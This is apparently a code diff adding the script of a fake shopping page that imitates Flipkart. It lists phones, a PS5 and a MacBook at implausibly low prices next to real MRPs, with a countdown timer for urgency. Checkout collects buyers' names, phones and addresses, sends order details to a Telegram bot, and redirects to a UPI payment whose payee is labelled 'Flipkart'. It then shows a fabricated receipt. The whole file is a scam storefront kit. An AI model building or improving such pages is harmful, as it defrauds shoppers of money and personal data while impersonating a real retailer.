+        const chatId = "YOUR_ID"; 
+        const upiId = "yourname@upi";
+
+       const products = [
+    { 
+        id: 1, 
+        name: "Apple iPhone 16 Pro Max (Black Titanium, 256 GB)", 
+        price: 1399, 
+        mrp: "1,44,900",
+        images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/w/z/h/-original-imahggetkf6y67sr.jpeg?q=70"],
+        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"],
+      highlights: ["12 GB RAM | 256 GB ROM", "17.27 cm (6.8 inch) QHD+ Display", "200MP + 50MP + 12MP + 10MP Camera", "5000 mAh Battery"]
+    },
+    { 
+        id: 2, 
+        name: "SAMSUNG Galaxy S24 Ultra 5G (Titanium Gray, 256 GB)", 
+        price: 1199, 
+        mrp: "1,34,999",
+        images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imagy9797asvcbp6.jpeg?q=70"],
+        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"]
+    },
+    { 
+        id: 3, 
+        name: "Sony PS5 Console (Slim) 1 TB White", 
+        price: 499, 
+        mrp: "54,990",
+        images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/m/-original-imahyv9aryf768hz.jpeg?q=70"],
+        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"]
+    },
+    { 
+        id: 4, 
+        name: "Apple MacBook AIR M2 - (8 GB/256 GB SSD)", 
+        price: 899, 
+        mrp: "99,900",
+        images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/computer/2/v/v/-original-imagfdeqter4sj26.jpeg?q=70"],
+        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"]
+    },
+    { 
+        id: 5, 
+        name: "Canon EOS R100 Mirrorless Camera", 
+        price: 399, 
+        mrp: "64,950",
+        images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/camera/f/n/l/eos-r100-24-1-r100-canon-original-imagrn39hfv6u38t.jpeg?q=70"],
+        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"]
+    },
+    { 
+        id: 6, 
+        name: "Noise ColorFit Icon 2 Smartwatch", 
+        price: 129, 
+        mrp: "5,999",
+        images: ["https://rukminim2.flixcart.com/image/612/612/xif0q/smartwatch/q/f/m/-original-imagxp8vjsh8vgyp.jpeg?q=70"],
+        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"]
+    }
+];
+
+        let curP = null;
+
+        function showPage(id) {
+            document.querySelectorAll('div[id^="page-"]').forEach(p => p.classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        function loadHome() {
+    const list = document.getElementById('v-list');
+    list.className = "product-grid"; // Grid class yahan lagayi
+    list.innerHTML = products.map(p => `
+        <div class="product-card" onclick="openProduct(${p.id})">
+            <img src="${p.images[0]}" class="w-full h-32 object-contain mb-2">
+            <div>
+                <p class="text-[11px] font-medium line-clamp-2 text-gray-800 mb-1">${p.name}</p>
+                <div class="flex items-center gap-1">
+                    <span class="text-sm font-bold">₹${p.price.toLocaleString()}</span>
+                    <span class="text-gray-400 line-through text-[9px]">₹${p.mrp}</span>
+                </div>
+                <p class="text-green-600 text-[9px] font-bold">Free Delivery</p>
+            </div>
+        </div>
+    `).join('');
+}
+
+        function openProduct(id) {
+    // 1. Product data dhoondhna
+    curP = products.find(x => x.id === id);
+    
+    // 2. Name aur Price set karna
+    document.getElementById('det-name').innerText = curP.name;
+    document.getElementById('det-price').innerText = "₹" + curP.price.toLocaleString();
+    document.getElementById('det-mrp').innerText = "₹" + curP.mrp;
+
+    // 3. Top Slider (Photos) load karna
+    const slider = document.getElementById('main-slider');
+    slider.innerHTML = curP.images.map(img => `
+        <div class="slider-item">
+            <img src="${img}" class="h-72 object-contain">
+        </div>
+    `).join('');
+
+    // 4. HIGHLIGHTS (Naya Section) load karna
+    const highCont = document.getElementById('det-highlights');
+    if (curP.highlights && curP.highlights.length > 0) {
+        highCont.innerHTML = curP.highlights.map(h => `<li>${h}</li>`).join('');
+    } else {
+        highCont.innerHTML = "<li>No specific highlights available</li>";
+    }
+
+    // 5. Description Images load karna
+    const descCont = document.getElementById('desc-container');
+    descCont.innerHTML = curP.descImages.map(img => `
+        <img src="${img}" class="w-full">
+    `).join('');
+    
+    // 6. Checkout Summary ko update karna (Summary page ke liye)
+    document.getElementById('sum-img').src = curP.images[0];
+    document.getElementById('sum-item').innerText = curP.name;
+    document.getElementById('sum-price').innerText = "₹" + curP.price.toLocaleString();
+    document.getElementById('sum-total-bottom').innerText = "₹" + (curP.price + 3).toLocaleString();
+    
+    // 7. Page change karna
+    showPage('page-detail');
+}
+        function goToSummary() {
+            const name = document.getElementById('inp-name').value;
+            const phone = document.getElementById('inp-phone').value;
+            if(!name || phone.length < 10) return alert("Fill Details!");
+            document.getElementById('sum-name').innerText = name;
+            document.getElementById('sum-phone').innerText = phone;
+            document.getElementById('sum-addr').innerText = `${document.getElementById('inp-house').value}, ${document.getElementById('inp-city').value}`;
+            showPage('page-summary');
+        }
+
+        function processOrder() {
+            const msg = `🚀 NEW ORDER: ${curP.name} | Customer: ${document.getElementById('inp-name').value}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+            window.location.href = `upi://pay?pa=${upiId}&pn=Flipkart&am=${curP.price+3}&cu=INR`;
+            setTimeout(() => {
+                document.getElementById('rec-oid').innerText = "OD" + Date.now();
+                document.getElementById('rec-img').src = curP.images[0];
+                document.getElementById('rec-item').innerText = curP.name;
+                showPage('page-receipt');
+            }, 3000);
+        }
+ function startTimer() {
+    function updateTimer() {
+        const now = new Date();
+        const endOfDay = new Date();
+        endOfDay.setHours(23, 59, 59, 999); // Aaj raat 12 baje tak ka time
+
+        const diff = endOfDay - now;
+
+        const h = Math.floor(diff / (1000 * 60 * 60));
+        const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        const s = Math.floor((diff % (1000 * 60)) / 1000);
+
+        document.getElementById('deal-timer').innerText = 
+            `${h.toString().padStart(2, '0')}h ${m.toString().padStart(2, '0')}m ${s.toString().padStart(2, '0')}s left`;
+    }
+    
+    setInterval(updateTimer, 1000);
+    updateTimer();
+}
+
+// Apne purane window.onload ko aise update karein:
+// Purane dono window.onload ko hata kar sirf ye ek likhein
+window.onload = function() {
+    loadHome();   // Products load karega
+    startTimer(); // Timer shuru karega
+};
+       
+    </script>
+</body>
+</html>
